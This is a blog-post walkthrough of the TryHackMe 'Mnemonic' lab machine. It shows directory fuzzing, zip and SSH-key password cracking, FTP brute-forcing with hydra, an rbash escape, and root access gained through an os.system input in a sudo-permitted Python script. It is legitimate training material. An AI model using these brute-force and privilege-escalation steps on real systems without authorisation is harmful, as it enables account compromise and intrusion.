---
layout: post
title: Mnemonic
date: 2020-10-1 00:00:00 +5:30
categories: [TryHackMe, Medium]
tags: [osint, dirbust, code-analysis] # add tag
image: /assets/img/mnemonic/mnem.png
---

## Description

The Following Post is writeup of mnemonic room of tryhackme <https://tryhackme.com/room/mnemonic>

|Machine|Detail
|:---|:--
|OS | Linux
|Rating | Medium
|Creator | [villwocki](https://tryhackme.com/p/villwocki)

## Summary

This room has 3 ports open 21, 80 and 1337. On dirbusting port 80 we will get user backups which contains info about ftp. Bruteforcing it will get us into ftp and there we will get id_rsa of one user.
Logging as that user in ssh at port 1337 get into rbash shell which can be bypassed and we can read dir of another user. We got some strange files in user home dir and the other dir leads to an image.
OSINT with the room name leads us to a github repo which have a decoder with that we can decode the image and get password for other user. There is a code which we can use as sudo but it has one weakness using which we can execute commands as root so got root.

## Walkthrough

### Enumeration

Starting with nmap scan.
```bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
| http-robots.txt: 1 disallowed entry
|_/webmasters/*
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
|   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
|_  256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

So 1337 have ssh server running.

#### Port80

![port80](/assets/img/mnemonic/port80.png)

![robots](/assets/img/mnemonic/robotstxt.png)

so we have robots.txt it directs us to webmasters.
For moving forward we have a way we can fuzz dir further

```bash
argenestel@parrot  ~/Desktop/tryhackme/mnemonic  ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.148.195/webmasters/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.148.195/webmasters/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 325, Words: 20, Lines: 10]
backups                 [Status: 301, Size: 327, Words: 20, Lines: 10]

So let's enum more.

 argenestel@parrot  ~/Desktop/tryhackme/mnemonic  ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.148.195/webmasters/backups/FUZZ.zip

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.148.195/webmasters/backups/FUZZ.zip
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
<redacted>                [Status: 200, Size: 408, Words: 1, Lines: 9]
```

Okay i assumed  as zip. so we can download the zip and see what we can find inside it.

### Exploitation

Ahh the zip seems encrypted.
So john have script which converts zip to john hash format and john can crack that.

```bash
argenestel@parrot  ~/Desktop/tryhackme/mnemonic  john --wordlist=/usr/share/wordlists/rockyou.txt john.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<redacted>         (backups.zip/backups/note.txt)
1g 0:00:00:02 DONE (2020-09-28 16:02) 0.4115g/s 5872Kp/s 5872Kc/s 5872KC/s 0050cent..0012093760
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

In zip we can see user info and get username.
Now Bruteforce the ftp pass.

```bash
argenestel@parrot  ~/Desktop/tryhackme/mnemonic/backups  hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.148.195
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-28 16:20:23
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.148.195:21/
[STATUS] 241.00 tries/min, 241 tries in 00:01h, 14344158 to do in 991:60h, 16 active
[STATUS] 245.33 tries/min, 736 tries in 00:03h, 14343663 to do in 974:27h, 16 active
[21][ftp] host: 10.10.148.195   login: ftpuser   password: <redacted>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-28 16:24:53
```

250 Directory successfully changed.
ftp> cd data-4
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 Jul 14 18:05 .
drwx------   12 1003     1003         4096 Jul 14 18:22 ..
drwxr-xr-x    2 0        0            4096 Jul 14 18:04 3
drwxr-xr-x    2 0        0            4096 Jul 14 18:04 4
-rwxr-xr-x    1 1001     1001         1766 Jul 13 20:34 id_rsa
-rwxr-xr-x    1 1000     1000           31 Jul 13 21:18 not.txt

Okay the ftp gave us id_rsa and a not.txt
The ssh key have pass phrase let's crack it
Using ssh2john => hash => hash crack

Got user login.

>But there is a script running as root which will kick us out and we have rbash

Alright i saw a weird 6450.txt file(let's note it we can use it later)
I was Stuck a bit here:
  Got idea to check for mnemonic decryption ans landed on <https://github.com/MustafaTanguner/Mnemonic/>
  So it's indeed right path but i need a image.
  I checked what i can do escape the rbash?

Todo: Escape Rbash and defeat the script
 <https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/>
I checked and we can bypass rbash using vi.

so after that we can check other dir let's check condor we have access to it.

```bash
james@mnemonic:/home$ ls -la condor
ls: cannot access 'condor/..': Permission denied
ls: cannot access 'condor/'\''<redacted>=='\''': Permission denied
ls: cannot access 'condor/.gnupg': Permission denied
ls: cannot access 'condor/.bash_logout': Permission denied
ls: cannot access 'condor/.bashrc': Permission denied
ls: cannot access 'condor/.profile': Permission denied
ls: cannot access 'condor/.cache': Permission denied
ls: cannot access 'condor/.bash_history': Permission denied
ls: cannot access 'condor/.': Permission denied
ls: cannot access 'condor/<redacted>==': Permission denied
total 0
d????????? ? ? ? ?            ?  .
d????????? ? ? ? ?            ?  ..
d????????? ? ? ? ?            ? '<redacted>'
l????????? ? ? ? ?            ?  .bash_history
-????????? ? ? ? ?            ?  .bash_logout
-????????? ? ? ? ?            ?  .bashrc
d????????? ? ? ? ?            ?  .cache
d????????? ? ? ? ?            ?  .gnupg
-????????? ? ? ? ?            ?  .profile
d????????? ? ? ? ?            ? ''\''<redacted>=='\'''
```

Alright base64 and we got flag and image url.

mnemonic + image + (Some config file... Hmmmm)
okay remember we got a 6450.txt yess.

![mnemonic](/assets/img/mnemonic/condorpass.png)

Hurray got user condor.

```bash
condor@mnemonic:~$ sudo -l
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
 ```

 Looking into source code examplecode.py there is a function where we can put input.
yes in option 0
 >os.system(input(Running...))

```bash
 Select:0
are you sure you want to quit ? yes : .

Running....bash

root@mnemonic:/root# id
uid=0(root) gid=0(root) groups=0(root)
```

I was stuck in root for few hours and doing something totally different.
